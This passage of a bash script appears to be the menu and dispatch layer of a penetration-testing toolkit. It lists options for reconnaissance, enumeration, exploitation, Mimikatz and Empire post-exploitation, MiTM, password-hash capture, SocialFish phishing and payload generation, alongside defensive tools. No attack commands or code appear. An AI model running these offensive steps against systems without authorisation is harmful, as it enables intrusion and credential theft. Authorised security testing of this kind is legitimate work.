  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read system_setup_choice
}

handle_system_setup_choice() {
  case $1 in
    1) update_system ;;
    2) install_general_tools ;;
    3) install_recon_tools ;;
    4) install_enum_tools ;;
    5) install_exploitation_tools ;;
    6) install_post_exploitation_tools ;;
    7) install_defense_tools ;;
    8) install_analytics_tools ;;
    9) setup_ufw ;;
    10) setup_fail2ban ;;
    11) setup_splunk ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

recon_menu() {
  clear
  echo "============================================"
  echo "        Reconnaissance Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Nmap Recon                        |"
  echo "               +--------------------------------------+"
  echo "               | 2. Masscan Recon                     |"
  echo "               +--------------------------------------+"
  echo "               | 3. Amass Recon                       |"
  echo "               +--------------------------------------+"
  echo "               | 4. Maltego Recon                     |"
  echo "               +--------------------------------------+"
  echo "               | 5. Social Analyzer Recon             |"
  echo "               +--------------------------------------+"
  echo "               | 6. DNSRecon                          |"
  echo "               +--------------------------------------+"
  echo "               | 7. DNSEnum                           |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read recon_choice
}

handle_recon_choice() {
  case $1 in
    1) recon_nmap ;;
    2) recon_masscan ;;
    3) recon_amass ;;
    4) recon_maltego ;;
    5) recon_social_analyzer ;;
    6) recon_dnsrecon ;;
    7) recon_dnsenum ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

enum_menu() {
  clear
  echo "============================================"
  echo "        Enumeration Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Enum4Linux Enumeration            |"
  echo "               +--------------------------------------+"
  echo "               | 2. SMBClient Enumeration             |"
  echo "               +--------------------------------------+"
  echo "               | 3. NBScan Enumeration                |"
  echo "               +--------------------------------------+"
  echo "               | 4. LDAP Enumeration                  |"
  echo "               +--------------------------------------+"
  echo "               | 5. SNMP Enumeration                  |"
  echo "               +--------------------------------------+"
  echo "               | 6. DNSRecon Enumeration              |"
  echo "               +--------------------------------------+"
  echo "               | 7. DNSEnum Enumeration               |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read enum_choice
}

handle_enum_choice() {
  case $1 in
    1) enum_enum4linux ;;
    2) enum_smbclient ;;
    3) enum_nbtscan ;;
    4) enum_ldapsearch ;;
    5) enum_snmpwalk ;;
    6) enum_dnsrecon ;;
    7) enum_dnsenum ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

vuln_menu() {
  clear
  echo "============================================"
  echo "        Vulnerability Analysis Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Nikto Vulnerability Analysis      |"
  echo "               +--------------------------------------+"
  echo "               | 2. ZAP Vulnerability Analysis        |"
  echo "               +--------------------------------------+"
  echo "               | 3. SQLMap Vulnerability Analysis     |"
  echo "               +--------------------------------------+"
  echo "               | 4. OpenVAS Vulnerability Analysis    |"
  echo "               +--------------------------------------+"
  echo "               | 5. Nessus Vulnerability Analysis     |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read vuln_choice
}

handle_vuln_choice() {
  case $1 in
    1) vuln_nikto ;;
    2) vuln_zap ;;
    3) vuln_sqlmap ;;
    4) vuln_openvas ;;
    5) vuln_nessus ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

exploit_menu() {
  clear
  echo "============================================"
  echo "        Exploitation Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Metasploit Exploitation           |"
  echo "               +--------------------------------------+"
  echo "               | 2. SQLMap Exploitation               |"
  echo "               +--------------------------------------+"
  echo "               | 3. BurpSuite Exploitation            |"
  echo "               +--------------------------------------+"
  echo "               | 4. ExploitDB Search                  |"
  echo "               +--------------------------------------+"
  echo "               | 5. Fuzzing                           |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read exploit_choice
}

handle_exploit_choice() {
  case $1 in
    1) exploit_msfconsole ;;
    2) exploit_sqlmap ;;
    3) exploit_burpsuite ;;
    4) exploit_exploitdb ;;
    5) exploit_fuzzing ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

post_exploit_menu() {
  clear
  echo "============================================"
  echo "        Post-Exploitation Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Bloodhound Post-Exploitation      |"
  echo "               +--------------------------------------+"
  echo "               | 2. Mimikatz Post-Exploitation        |"
  echo "               +--------------------------------------+"
  echo "               | 3. Empire Post-Exploitation          |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read post_exploit_choice
}

handle_post_exploit_choice() {
  case $1 in
    1) post_exploit_bloodhound ;;
    2) post_exploit_mimikatz ;;
    3) post_exploit_empire ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

mitm_menu() {
  clear
  echo "============================================"
  echo "        MiTM Attack Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Ettercap MiTM Attack              |"
  echo "               +--------------------------------------+"
  echo "               | 2. mitmproxy MiTM Attack             |"
  echo "               +--------------------------------------+"
  echo "               | 3. Responder MiTM Attack             |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read mitm_choice
}

handle_mitm_choice() {
  case $1 in
    1) mitm_ettercap ;;
    2) mitm_mitmproxy ;;
    3) mitm_responder ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

hash_capture_menu() {
  clear
  echo "============================================"
  echo "        Password Hash Capturing Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Responder Hash Capturing          |"
  echo "               +--------------------------------------+"
  echo "               | 2. Ettercap Hash Capturing           |"
  echo "               +--------------------------------------+"
  echo "               | 3. CredSniper Hash Capturing         |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read hash_capture_choice
}

handle_hash_capture_choice() {
  case $1 in
    1) hash_capture_responder ;;
    2) hash_capture_ettercap ;;
    3) hash_capture_creds ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

phishing_menu() {
  clear
  echo "============================================"
  echo "        Phishing Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. SocialFish Phishing Attack        |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read phishing_choice
}

handle_phishing_choice() {
  case $1 in
    1) phishing_socialfish ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

honeypot_menu() {
  clear
  echo "============================================"
  echo "        Honeypots Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Deploy Cowrie Honeypot            |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read honeypot_choice
}

handle_honeypot_choice() {
  case $1 in
    1) honeypot_cowrie ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

payload_menu() {
  clear
  echo "============================================"
  echo "        Payloads Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Generate Payload                  |"
  echo "               +--------------------------------------+"
  echo "               | 2. Search Payload Database           |"
  echo "               +--------------------------------------+"
  echo "               | 3. Get Payload for Scope             |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read payload_choice
}

handle_payload_choice() {
  case $1 in
    1) generate_payload ;;
    2) search_payload_database ;;
    3) get_scope_payload ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

# Main loop
while true; do
  display_menu
  handle_choice $choice
  echo "Press Enter to continue..."
  read
done
